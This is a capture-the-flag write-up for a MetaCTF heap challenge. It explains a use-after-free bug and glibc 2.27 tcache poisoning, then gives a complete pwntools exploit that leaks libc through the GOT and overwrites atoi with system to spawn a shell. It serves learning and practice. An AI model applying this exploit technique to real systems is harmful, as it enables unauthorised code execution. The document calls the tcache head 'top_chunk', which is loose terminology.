# User Application Firewall #

---
## Description ## 
---
Created by MetaCTF

Our penetration testing team is just one server away from getting access to all of C3's networks! This one's proving to be very tough, as the only thing that's running is their User Application Firewall. The company claims this service is hardened against any buffer overflow and other stack-based vulnerabilities. They even give you the compiled binary, their source code and libc that they used to run this service! Can you break in?

Connect to host1.metaproblems.com 5600 to see if you can gain access to the system! This service is running on Ubuntu 18.04.

NOTE: This flag's format is MetaCTF{}

---
## Analysis ## 
---
Starting off with the usual checks: 

```
$ file uaf
uaf: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=0737cc89fe74d374c1581554917bf6f381b1baa7, not stripped
```

```
$ checksec uaf
[*] '/home/bugs/projects/ctf/ritsec/pwn/uaf/uaf'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```


To make our lives a bit easier, we are given the source code of this application. 
The title also hints at this being a UAF or Use-After-Free vulnerability.

Let's start looking at the functionality of this binary: 

```
$ ./uaf
Welcome to our User Application Firewall (UAF)!
---Choose your option:---
1. Create a firewall rule
2. View a firewall rule
3. Edit a firewall rule
4. Delete a firewall rule
5. Exit
> 
```

Going over each of these menu options with the corresponding code: 

`1. Create a firewall rule`
```c
void create() {
	if(created >= 32) {
		puts("You have reached the max number of firewall rules.");
		return;
	}
	int index;
	for(index = 0; index < 32; index++) {
		if(rules[index] == 0 || freed[index] != 0) {
			break;
		}
	}
	rules[index] = malloc(255);
	puts("Firewall rule set. Enter your firewall rule here:");
	read(0, rules[index], 255);
	printf("Your firewall rule ID is: %d\n", index);
	freed[index] = 0;
	created++;
}
```

We learn that: 

    1. we can have a max of 32 'rules'.
    2. 'rules' are comprised of a heap chunk of length 255, allocated by libc malloc().
    3. we get to read in 255 characters of data into this heap chunk.
    4. pointers to the 'rules' are stored in the global `rules` array.
    5. there's a seperate global array called 'freed' which keeps track of rules that have been deleted/free'd

`2. View a firewall rule`
```c
void view() {
	char val[8] = {0};
	int index;
	int choice = -1;
	for(index = 0; index < 32; index++) {
		if(rules[index] == 0) {
			break;
		}
	}
	while(choice < 0 || choice >= index) {
		puts("Enter the firewall ID which you want to view:");
		fgets(val, 8, stdin);
		choice = atoi(val);
		if(choice < 0 || choice >= index) {
			puts("Unknown firewall rule ID.");
			return;
		} 
	}
	printf("Your rule: %s\n", rules[choice]);
}
```

The `view()` function simply allows us to print out the contents of the heap chunks corresponding to the 'rule' we specify.

Let's continue with the edit function: 

`3. Edit a firewall rule`
```c
void edit() {
	char val[8] = {0};
	int index;
	int choice = -1;
        for(index = 0; index < 32; index++) {
                if(rules[index] == 0) {
                        break;
                }
        }
        while(choice < 0 || choice >= index) {
                puts("Enter the firewall ID which you want to edit:");
                fgets(val, 8, stdin);
                choice = atoi(val);
                if(choice < 0 || choice >= index) {
                        puts("Unknown firewall rule ID.");
			return;
                }
        }
	puts("Edit your new firewall rule here:");
	read(0, rules[choice], 255);
	puts("Your firewall rule has been updated");
}
```

As expected, this function allows us to edit the contents of the heap chunk. 

Finally, we have the `delete()` function.

`4. Delete a firewall rule`

```c
void del() {
        char val[8] = {0};
        int index;
        int choice = -1;
        for(index = 0; index < 32; index++) {
                if(rules[index] == 0 || freed[index] != 0) {
                        break;
                }
        }
        while(choice < 0 || choice >= index || freed[choice] != 0) {
                puts("Enter the firewall ID which you want to delete:");
                fgets(val, 8, stdin);
                choice = atoi(val);
                if(choice < 0 || choice >= index || freed[choice] != 0) {
                        puts("Unknown firewall rule ID.");
			return;
                }
        }
	free(rules[choice]);
	freed[choice] = 1;
	puts("Rule deleted");
	created--;

}
```

Again, as expected, this function: 

    1. free's a rule / heap chunk of our choice.
    2. sets freed[index] to 1, indicating that this chunk has been freed.

---
## libc 2.27 tcache ## 
---

To understand how to exploit this binary we need to take a step back and learn about how the libc default allocators caching system works. Every thread has its own 'tcache' or 'thread cache' which behaves like a `LIFO` cache. [I've briefly written about how this cache works previously in a similar but simpler challenge writeup.](https://github.com/TsarSecurity/ctf-writeups/blob/main/antisyphon-flash3/pwn/writeup.md)


This cache is implemented as a singly-linked list. Let's look at some examples of this behaviour because it can be hard to visualize this process and wrap your mind around what is happening.

`LIFO caching` 
```c
int a = malloc(255);    // malloc returns a pointer to 0x555000
int b = malloc(255);    // malloc returns a pointer to 0x555110

free(a);                // libc caches the chunk at address 0x555000
free(b);                // libc caches the chunk at address 0x555110

int c = malloc(255);    // libc looks at its cache and determines the last free'd chunk is at 0x555110
int d = malloc(255);    // libc looks at its cache and determines the last free'd chunk is at 0x555000
```

In the above example, `a` and `d` both point to the same chunk, as do `b` and `c`.

So how does this caching work exactly? Libc only keeps track of the **last free'd chunk** in a pointer called the `top_chunk`.

```c
// top_chunk points to nothing because there are no chunks in the cache.
int a = malloc(255);    // malloc allocates a new chunk (because top_chunk is 0) and returns the pointer to it (0x555000)
// top_chunk still points to nothing 
int b = malloc(255);    // malloc allocates a new chunk (because top_chunk is 0) and returns the pointer to it (0x555110)

free(a);                // libc sets its top_chunk to 0x555000, indicating that 0x555000 is the last free'd chunk.
```

You might be thinking, what happens if we free another chunk? We can't just overwrite the top_chunk with the address of the second free'd chunk because we would lose track of the first! If we free a second chunk and top_chunk is not 0, meaning there is another chunk in the cache already, libc simply writes the current top_chunk to the first 8 bytes of the newly free'd chunk, and *then* updates top_chunk. We've basically pushed the first free'd chunk onto a stack.

```c
// top_chunk points to nothing because there are no chunks in the cache.
int a = malloc(255);    // malloc allocates a new chunk (because top_chunk is 0) and returns the pointer to it (0x555000)
// top_chunk still points to nothing 
int b = malloc(255);    // malloc allocates a new chunk (because top_chunk is 0) and returns the pointer to it (0x555110)

free(a);                // libc sets its top_chunk to 0x555000, indicating that 0x555000 is the last free'd chunk.
free(b);                // top_chunk already points to a chunk, so we write 0x555000 to the first 8 bytes of chunk b at address 0x555110
                        // we also update top_chunk to point to 0x555110
```

The exact opposite happens when we use `malloc()` to allocate chunks.

```c
[...]

int c = malloc(255);    // top_chunk points to 0x555110, which is the first free chunk, and the chunk contains a pointer to 0x555000
                        // so top_chunk gets updated to 0x555000 and malloc returns 0x555110
int d = malloc(255);    // top_chunk points to 0x555000 but this chunk does not contain a 'next' pointer, so top chunk gets set to 0
                        // and malloc returns 0x555000
```

To recap, a bunch of cached chunks will look something like this: 

```c
int a = malloc(255);    // 0x555000
int b = malloc(255);    // 0x555100
int c = malloc(255);    // 0x555200
int d = malloc(255);    // 0x555300

free(d);
free(c);
free(b);
free(a);

top_chunk = 0x555000
address     name        contents
0x555000    [chunk a]   0x555100
0x555100    [chunk b]   0x555200
0x555200    [chunk c]   0x555300
0x555300    [chunk d]   
```

The big take-away from this is that: **if we are somehow able to corrupt the stored `next` pointer inside a free'd chunk**, wether it be through an overflow or a direct write, **we can control which address `malloc()` is going to return the next time we call it**. In other words: we can craft `fake allocations` at any address.

---
## The Bug ## 
---
When we create a firewall rule, the global array `rules` gets updated with a pointer to the newly created heap chunk by `malloc()`.
The bug in this program is in the `del()` function: when we delete a firewall rule, the chunk gets free'd, but the pointer to the chunk is not removed 
from the global `rules` array. 

```c
	free(rules[choice]);
	freed[choice] = 1;
	// there should've been a 
	// rules[choice] = 0; 
	// here
	puts("Rule deleted");
	created--;
```
This means that we can still call the functions `view()` and `edit()` on chunks that have been free'd. This is exactly the condition we need for an `arbitrary read` or `arbitrary write` primitive!

So how does this work?

Let's say we create 2 firewall rules, one with "AAAAAAAA" and one with "BBBBBBBB" and then free them. 

```
rules[0] = 0x555000 -> 0x4141414141414141.... (chunk: in-use)
rules[1] = 0x555100 -> 0x4242424242424242.... (chunk: in-use)

// we now delete both
rules[0] = 0x555000 -> 0x0000000000555100.... (chunk: free)
rules[1] = 0x555100 -> 0x0000000000000000.... (chunk: free)
```

We now have 2 references to free'd chunks, one of which contains a `next` pointer. And we also have the ability to run `edit()` on these chunks, so we can corrupt the `next` pointer with an arbitrary value / address. 

Let's say we edit the free'd chunk pointed to by `rules[0]` and change `0x0000000000555100` to `0x4343434343434343` 

```
rules[0] = 0x555000 -> 0x4343434343434343.... (chunk: free)
rules[1] = 0x555100 -> 0x0000000000000000.... (chunk: free)

// we add 2 new firewall rules
rules[0] = 0x555000 -> 0x0000000000000000.... 
// while the malloc() for rules[0] happened, libc picked up 0x4343434343434343 as the new top chunk
rules[1] = 0x4343434343434343 -> <whatever>
```

We now have a rule that points to an arbitrary address which we can, again, call either `edit()` or `view()` on. These give us an arbitrary read and write primitive. 

If we call view() on rule 1, it prints out the content at address 0x4343434343434343 and similarly, if we call `edit()` on rule 1 we can write to 0x4343434343434343.

---
## Checking some assumptions ##
---

Let's put all this newly found knowledge to the test!

We assumed that if we followed these upcoming steps, the chunk pointed to by `rules[0]` should contain a pointer to the free'd chunk referenced by `rules[0]`. 

1. create rule `rules[0]`
2. create rule `rules[1]`
3. delete rule 1
4. delete rule 0
5. print rule 0

For debugging purposes, we'd like to run this binary with the provided `libc.so.6` so we will create a simple 'launcher': 

`test.py`
```python
#!/usr/bin/env python3
from pwn import *

r = process(["./ld-2.27.so", "./uaf"], env={"LD_PRELOAD":"./libc.so.6"})
r.interactive()
```

After following the 5 steps we get the following output: 

```
$ ./test.py 
[+] Starting local process './ld-2.27.so': pid 4075
[*] Switching to interactive mode
Welcome to our User Application Firewall (UAF)!
---Choose your option:---
1. Create a firewall rule
2. View a firewall rule
3. Edit a firewall rule
4. Delete a firewall rule
5. Exit
> $ 1
Firewall rule set. Enter your firewall rule here:
$ AAAAAAAA
Your firewall rule ID is: 0
---Choose your option:---
1. Create a firewall rule
2. View a firewall rule
3. Edit a firewall rule
4. Delete a firewall rule
5. Exit
> $ 1
Firewall rule set. Enter your firewall rule here:
$ BBBBBBBB
Your firewall rule ID is: 1
---Choose your option:---
1. Create a firewall rule
2. View a firewall rule
3. Edit a firewall rule
4. Delete a firewall rule
5. Exit
> $ 4
Enter the firewall ID which you want to delete:
$ 1
Rule deleted
---Choose your option:---
1. Create a firewall rule
2. View a firewall rule
3. Edit a firewall rule
4. Delete a firewall rule
5. Exit
> $ 4
Enter the firewall ID which you want to delete:
$ 0
Rule deleted
---Choose your option:---
1. Create a firewall rule
2. View a firewall rule
3. Edit a firewall rule
4. Delete a firewall rule
5. Exit
> $ 2
Enter the firewall ID which you want to view:
$ 0
Your rule: p\x13VUU
---Choose your option:---
1. Create a firewall rule
2. View a firewall rule
3. Edit a firewall rule
4. Delete a firewall rule
5. Exit
> $  
```

Exactly what we expected, there's a heap address (`Your rule: p\x13VUU`) when we print out the content of rule 0!

```python
>>> hex(u64(b"p\x13VUU\x00\x00\x00"))
'0x5555561370'
>>> 
```

To be able to interact with the process more easily in preparation to developing an exploit, let's build some scaffolding:

```python
#!/usr/bin/env python3 
from pwn import *

def create(r, content):
    info(f"Creating chunk with contents {content}")
    r.recvuntil(b"5. Exit")
    r.sendline(b"1")
    r.recvline()
    r.send(content)
    r.recvline()

def edit(r, index, content):
    r.recvuntil(b"5. Exit\n")
    r.sendline(b"3")
    r.recvline()
    r.sendline(str(index).encode())
    r.recvline()
    r.send(content)


def delete(r, index):
    r.recvuntil(b"5. Exit\n")
    r.sendline(b"4")
    r.recvline()
    r.sendline(str(index).encode())
    r.recvline()

def view(r, index):
    r.recvuntil(b"5. Exit\n")
    r.sendline(b"2")
    r.recvline()
    r.sendline(str(index).encode())
    r.recvuntil(b"Your rule: ")
    return r.recvuntil(b"---Choose your option:---").split(b"---")[0]

r = process(["./ld-2.27.so", "./uaf"], env={"LD_PRELOAD":"./libc.so.6"})

r.interactive()
```

Now we can use these functions to create/edit/view/delete chunks. For example, we can recreate the previous steps with the following code: 

```python
[...]
create(r, b"AAAAAAAA")
create(r, b"BBBBBBBB")
delete(r, 1)
delete(r, 0)
leak = view(r, 0)
print(leak)

r.interactive()
```

```
$ ./test.py 
[+] Starting local process './ld-2.27.so': pid 4449
[*] Creating chunk with contents b'AAAAAAAA'
[*] Creating chunk with contents b'BBBBBBBB'
b'p\xc3\x8aUUU\n'
```

Perfect. 

---
## Developing an exploit ##
---

So, we theoretically have an `arbitrary read` and `arbitrary write` primitive. What we need to accomplish to get a shell with this is two-fold: 

1. Leak any address that points into `libc` so we can calculate where functions like `system()` are.
2. Hijack control flow somehow.

There's a little catch here: in the process of creating a new rule/chunk, we're also forced to write at least 1 byte to the corrupted target address. This isn't a big problem in terms of overwriting data we need for a leak, but it does restrict us to only being able to leak from memory that is also `writable`. 

### GOT ### 

In this specific challenge, the `GOT` is all we need. remember from the output of `checksec` we determined that: 

```
    RELRO:    Partial RELRO
```

This means that the GOT (which contains function pointers to libc) is writeable!

We can both leak these pointers and overwrite them if we want. 

So the exploit strategy is: 

1. create a `fake chunk` that points to an address in `GOT` and use this to leak a function address.
2. create a `fake chunk` that points to an address in `GOT` so we can overwrite it to hijack control flow.

Let's look at which functions we have available in the GOT: 

```
$ readelf --relocs ./uaf
[...]
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000404018  000100000007 R_X86_64_JUMP_SLO 0000000000000000 free@GLIBC_2.2.5 + 0
000000404020  000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
000000404028  000300000007 R_X86_64_JUMP_SLO 0000000000000000 __stack_chk_fail@GLIBC_2.4 + 0
000000404030  000400000007 R_X86_64_JUMP_SLO 0000000000000000 setbuf@GLIBC_2.2.5 + 0
000000404038  000500000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0
000000404040  000600000007 R_X86_64_JUMP_SLO 0000000000000000 alarm@GLIBC_2.2.5 + 0
000000404048  000700000007 R_X86_64_JUMP_SLO 0000000000000000 read@GLIBC_2.2.5 + 0
000000404050  000900000007 R_X86_64_JUMP_SLO 0000000000000000 fgets@GLIBC_2.2.5 + 0
000000404058  000a00000007 R_X86_64_JUMP_SLO 0000000000000000 signal@GLIBC_2.2.5 + 0
000000404060  000c00000007 R_X86_64_JUMP_SLO 0000000000000000 malloc@GLIBC_2.2.5 + 0
000000404068  000d00000007 R_X86_64_JUMP_SLO 0000000000000000 atoi@GLIBC_2.2.5 + 0
000000404070  000e00000007 R_X86_64_JUMP_SLO 0000000000000000 exit@GLIBC_2.2.5 + 0
```

Remember that when we perform the leak, we are also overwriting at least 1 byte so we are corrupting the function address. This is important because the program will crash if we choose a function that is still used after we performed our arbitrary read. Luckily, we have the function `setbuf()` in the GOT, which is only called at the start of `main()` and then never again.

### Leaking LIBC ###

To leak `setbuf@GOT` we need to create a `fake chunk` that points to it.
Our `arbitrary read` primitive would look something like the following: 

1. create rule 0
2. create rule 1
3. delete rule 1
4. delete rule 0

5. rule 0 now contains a `next` pointer so we edit rule 0 and write the address of `setbuf@GOT` 
 
6. create rule 0  -- this will set top_chunk to the value of `next` pointer 
7. create rule 1  -- libc now uses our corrupted top_chunk to allocate a `fake chunk` at address `setbuf@GOT` 
8. view rule 1 -- this will print out the contents of `setbuf@GOT` 

In code, this would look something like the following: 

```python
[...]
r = process(["./ld-2.27.so", "./uaf"], env={"LD_PRELOAD":"./libc.so.6"})

e = ELF("./uaf")

create(r, b"AAAAAAAA")
create(r, b"BBBBBBBB")
delete(r, 1)
delete(r, 0)
edit(r, 0, p64(e.got['setbuf'])) # this will corrupt the next pointer

create(r, b"A") # create rule 0
create(r, b"B") # create rule 1

leak = view(r, 1)
print(leak)

r.interactive()
```

```
$ ./test.py 
[+] Starting local process './ld-2.27.so': pid 5247
[*] '/home/bugs/projects/ctf/ritsec/pwn/uaf/uaf'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Creating chunk with contents b'AAAAAAAA'
[*] Creating chunk with contents b'BBBBBBBB'
[*] Creating chunk with contents b'A'
[*] Creating chunk with contents b'B'
b'B\x85\x08\x88\xab\x7f\n'
```

```python
>>> hex(u64(b"B\x85\x08\x88\xab\x7f\x00\x00"))
'0x7fab88088542'
>>> 
```

Great! We succesfully leaked libc. We can even see the "B" or 0x42 we overwrote the least signiticant byte with. From here we need to calculate the `base address` of `libc`. In order to accomplish this, we need to know at what relative address setbuf is located:

```
$ objdump -D ./libc.so.6 | grep -i setbuf
[...]
0000000000088540 <setbuf@@GLIBC_2.2.5>:
[...]
```

The offset is `0x88540`, but we overwrote the last byte with 0x42, so the actual offset we leaked is at `0x88542`, which means we need to substract `0x88542` from the leaked address to calculate the `base address`. This makes perfect sense in the previously leaked value: 

```
0x7fab88088542 - 0x88542 = 0x7fab88000000
```

To parse this leak neatly, we add the following code: 

```python
[...]
libc = ELF("./libc.so.6")
# leak libc
libc_leak = u64(view(r, 1).strip().ljust(8, b"\x00"))
info(f"libc_leak: {hex(libc_leak)}")

libc_base = libc_leak - 0x88542
info(f"libc_base: {hex(libc_base)}")
```

### Hijacking control flow ### 

Next up is hijacking control flow by overwriting a function in the `GOT`. Because we would eventually like to call `system("/bin/sh")`, it would be helpful if there are any functions in the binary already that get called with us controlling the first argument.

If we look at main menu-loop again: 

```c
	while (1) {
		menu();
		printf("> ");
		fgets(val, 8, stdin);
		option = atoi(val);
		switch(option) {
```

We see that conveniently, `atoi()` is called on a buffer called `val` which we control the contents of. In other words, if we overwrite `atoi@GOT` the menu code becomes equivalent to:

```c
	while (1) {
		menu();
		printf("> ");
		fgets(val, 8, stdin);
		option = system(val);
		switch(option) {
```

First of all, lets calculate where `system()` is: 

```python
[...]
libc_system = libc_base + libc.symbols['system']
info(f"libc_system: {hex(libc_system)}")
```


We perform the same steps as with the arbitrary read to create a `fake chunk` that points to `atoi@GOT` and overwrite the address with the address of `system()`

Our full exploit now becomes:

```python
[...]
r = process(["./ld-2.27.so", "./uaf"], env={"LD_PRELOAD":"./libc.so.6"})

e = ELF("./uaf")

# create chunks for arb_read
create(r, b"AAAAAAAA")
create(r, b"BBBBBBBB")

# create chunks for arb_write
create(r, b"CCCCCCCC")
create(r, b"DDDDDDDD")

# perform arb_read 
delete(r, 1)
delete(r, 0)
edit(r, 0, p64(e.got['setbuf'])) # this will corrupt the next pointer

create(r, b"A") # create rule 0
create(r, b"B") # create rule 1

# leak libc
libc = ELF("./libc.so.6")
libc_leak = u64(view(r, 1).strip().ljust(8, b"\x00"))
info(f"libc_leak: {hex(libc_leak)}")

libc_base = libc_leak - 0x88542
info(f"libc_base: {hex(libc_base)}")

libc_system = libc_base + libc.symbols['system']
info(f"libc_system: {hex(libc_system)}")

# perform arb_write
delete(r, 3)
delete(r, 2)

edit(r, 2, p64(e.got['atoi']))

create(r, b"A")
create(r, p64(libc_system))

r.sendafter(b"Exit\n", b"/bin/sh")

# got shell
r.interactive()
```
